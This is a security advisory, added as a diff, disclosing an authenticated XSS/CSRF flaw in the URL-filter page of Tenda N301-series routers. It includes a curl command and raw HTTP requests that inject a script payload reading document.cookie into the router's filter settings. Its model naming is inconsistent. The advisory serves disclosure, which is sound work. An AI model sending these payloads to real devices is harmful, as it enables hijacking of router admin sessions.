@@ -1,0 +1,166 @@
+========================================================
+Authenticated  XSRF in Tenda TE-N3 N150 (2014 Model)
+========================================================
+
+.. contents:: Table Of Content
+
+Overview
+========
+
+Title:- Authenticated XSRF in Tenda TE-N3 N150 
+#CVE-ID :- CVE-2023-xxxx
+Author: Kaustubh G. Padwad, Uday Lokhande
+Vendor: Tenda (www.tendacn.com)
+Products:
+	1.Tenda V5.07.53_en_FOR01 (Tested and Verified)
+Potential 
+	2.Tenda V5.07.49_en_N301V1.0 firmware with respective firmware or below
+
+Severity: Medium
+
+Advisory ID
+============
+UDSA-Dev-001
+
+About the Product:
+==================
+
+The N301 Wireless N300 Easy Setup Router is designed to setup more easily for the home user. It 
+complies with IEEE802.11n, delivers wireless speeds of up to 300 Mbps, making it perfect for 
+everyday web activities like e-mail, chatting, streaming videos, online gaming and more. The N301 
+can also work as a client router to connect ISP network wirelessly or uplink AP to share the 
+Internet to every corner,elimating the dead point. 
+
+Features:
+=========
+Input Type RJ-45 (Ethernet Cable) supported by neighbourhood cable broadband ISPs such as Hathway, 
+ACT, Tikona, Airtel Fibrenet, MyWorld, Nextra, Siti Cable, You Broadband, Spectranet etc.  Complies 
+with IEEE 802.11n, IEEE 802.11g, IEEE 802.11b, IEEE 802.3, IEEE 802.3u, Omni directional antenna, 
+64-/128- bit WEP, WPA-PSK, WPA2-PSK, Up to 150Mbps wireless speed, WPS, Wireless Access Control 
+(Wireless MAC filter), SSID Broadcast: Enable/Disable, Channel 1-11.
+
+
+Description: 
+============
+An issue was discovered on Tenda Router Wireless Easy Setup Router which is a specific version 
+released in 2014 and was addressed as Tenda TE-N300 series (the same is potentially used firmware for 
+2017 version of Tenda TE-N300 routers).
+
+While user set up the URL filtering option, under Advance Settings > Security > Web URL Filters 
+- The value entered in the fields are not properly sanatized and hence it allow to execute 
+malicious javascript, which result a successful cross site scripting in /firewall_urlfilter.asp endpoint. 
+
+Since device dont have CSRF valdation it is possible to perform the XSRF by using CSRF + XSS 
+vulnerability.
+
+
+Additional Information
+========================
+
+To further explain, we have shown the simulation of the attack with GET request that is trapped 
+inside Burp Suite to understand the validating parameters and the input that is passed to the 
+request. Let us see the sample request that explains the endpoint and the inputs passed by user.
+
+Sample Request
+==============
+
+curl -i -s -k -X $'GET' \
+ -H $'Host: 192.168.0.1' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) 
+Gecko/20100101 Firefox/107.0' -H $'Accept: 
+text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,/;q=0.8' -H 
+$'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H 
+$'Upgrade-Insecure-Requests: 1' -H $'Referer: 
+http://192.168.0.1/goform/SafeUrlFilter?GO=firewall_urlfilter.asp&check=deny&curNum=1&CL1=192.168.0.12-192.168.0.12:\"/><script>alert(document.cookie)</script>,0-6,0-0,on,\"/><script>alert(document.cookie)</script>' \
+-b $'language=en; admin:language=en' \
+$'http://192.168.0.1/firewall_urlfilter.asp'
+
+
+GET /firewall_urlfilter.asp HTTP/1.1
+Host: 192.168.0.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,/;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: language=en; admin:language=en
+Upgrade-Insecure-Requests: 1
+Referer: 
+http://192.168.0.1/goform/SafeUrlFilter?GO=firewall_urlfilter.asp&check=deny&curNum=1&CL1=192.168.0.12-192.168.0.12:"/><script>alert(document.cookie)</script>,0-6,0-0,on,"/><script>alert(document.cookie)</script>
+
+Endpoint: 
+=========
+/firewall_urlfilter.asp
+
+Parameter is:
+=============
+GO=firewall_urlfilter.asp&check=deny&curNum=1&CL1=192.168.0.12-192.168.0.12:"/><script>alert(document.cookie)</script>,0-6,0-0,on,"/><script>alert(document.cookie)</script>
+
+[Affected Component]
+The module URL filtering has input field allows unsanitized data /firewall_urlfilter.asp endpoint
+
+------------------------------------------
+[Attack Type]
+Remote
+------------------------------------------
+[Impact Code execution]
+true
+------------------------------------------
+[Impact Denial of Service]
+false
+
+------------------------------------------
+[Attack Vectors]
+An Authentiated attacker need to run set the cross site scripting payload at /firewall_urlfilter.asp which is an endpoint defind in Web Console of Tenda > Advance > Security > 
+URL Filtering in order to achive XSS.
+
+[Vulnerability Type]
+====================
+CSRF, XSS
+
+How to Reproduce: (POC):
+========================
+
+One can use below exploit
+
+GET /firewall_urlfilter.asp HTTP/1.1
+Host: 192.168.0.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,/;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: language=en; admin:language=en
+Upgrade-Insecure-Requests: 1
+Referer: 
+http://192.168.0.1/goform/SafeUrlFilter?GO=firewall_urlfilter.asp&check=deny&curNum=1&CL1=192.168.0.12-192.168.0.12:"/><script>alert(document.cookie)</script>,0-6,0-0,on,"/><script>alert(document.cookie)</script>
+
+Attacker needs to run above requests in order to achive to XSRF.
+
+
+Mitigation
+==========
+Upgrade to the latest firmware manually
+
+
+[Vendor of Product]
+Tenda, a company with global presence for Networking devices (http://www.tendacn.com)
+
+Disclosure: 
+===========
+22-Jan-2023:- reported this to vendor
+
+
+Credits:
+========
+* Kaustubh Padwad
+* Information Security Researcher
+* kingkaustubh@me.com
+* https://s3curityb3ast.github.io/
+* https://twitter.com/s3curityb3ast
+* https://www.linkedin.com/in/kaustubhpadwad
+
+* Uday Lokhande
+* CyberSecurity Enthusiastic
+* udayom@gmail.com
+* https://udayom.github.io
+* https://www.linkedin.com/in/udayom
